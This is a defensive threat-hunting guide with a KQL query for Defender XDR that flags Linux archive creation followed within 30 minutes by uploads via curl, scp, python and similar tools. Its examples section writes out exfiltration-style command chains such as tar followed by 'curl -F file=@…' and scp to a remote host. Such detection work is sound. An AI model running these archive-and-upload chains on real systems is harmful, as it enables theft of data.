## Linux – Archive Command Followed by Upload Egress – Last 24h

### Query name

**`Linux – Archive command followed by upload egress – last 24h`**

---

## Why this hunt works on Linux

On Linux systems:

* Archive creation often occurs in memory‑backed locations (for example `/tmp`)
* File telemetry is not guaranteed for all filesystems or mount types
* Exfiltration is frequently performed by a *different process* than the one that created the archive

As a result, correlating **process execution + network egress within a time window** is significantly more reliable than attempting a strict file‑event join.

---

## Query

```kql
// Update DeviceName and time window as required
let Device = "DeviceNameHere";
let ArchiveProc =
    DeviceProcessEvents
    | where Timestamp > ago(24h)
    | where DeviceName =~ Device
    | where FileName in ("tar","zip","gzip")
    | where ProcessCommandLine has_any (".zip", ".tgz", ".tar", "tar -c", "tar -cz", "zip ")
    | project
        DeviceId,
        DeviceName,
        ArchiveTime = Timestamp,
        ArchiveProc = FileName,
        ArchiveCmd = ProcessCommandLine,
        AccountName;
let UploadEgress =
    DeviceNetworkEvents
    | where Timestamp > ago(24h)
    | where DeviceName =~ Device
    | where RemoteIP !startswith "127."
    | where RemoteIPType == "Public" or isempty(RemoteIPType)
    | where InitiatingProcessFileName in ("curl","wget","python","python3","openssl","scp","sftp")
    | project
        DeviceId,
        NetTime = Timestamp,
        NetProc = InitiatingProcessFileName,
        NetCmd = InitiatingProcessCommandLine,
        RemoteIP,
        RemotePort;
ArchiveProc
| join kind=inner (UploadEgress) on DeviceId
| where NetTime between (ArchiveTime .. ArchiveTime + 30m)
| project
    ArchiveTime,
    NetTime,
    DeviceName,
    AccountName,
    ArchiveProc,
    ArchiveCmd,
    NetProc,
    NetCmd,
    RemoteIP,
    RemotePort
| order by ArchiveTime desc
```

---

## What this query surfaces

This hunt will surface behaviour such as:

* Creation of archives immediately prior to outbound uploads
* Data exfiltration using common Linux utilities (`curl`, `scp`, `python`)
* Red team and EDR test activity
* Manual attacker workflows where tooling is chained together

Examples include:

* `tar -czf data.tgz data/` followed by `curl -F file=@data.tgz https://…`
* `zip staging.zip *` followed by `scp staging.zip user@remote:/tmp/`

---

## Why this avoids common false negatives

This approach intentionally avoids:

* Dependence on `DeviceFileEvents`
* Assumptions about filesystem visibility
* Assumptions that the same process performs both actions

As a result, it reliably catches activity that Defender XDR alerts on but which simpler hunts often miss.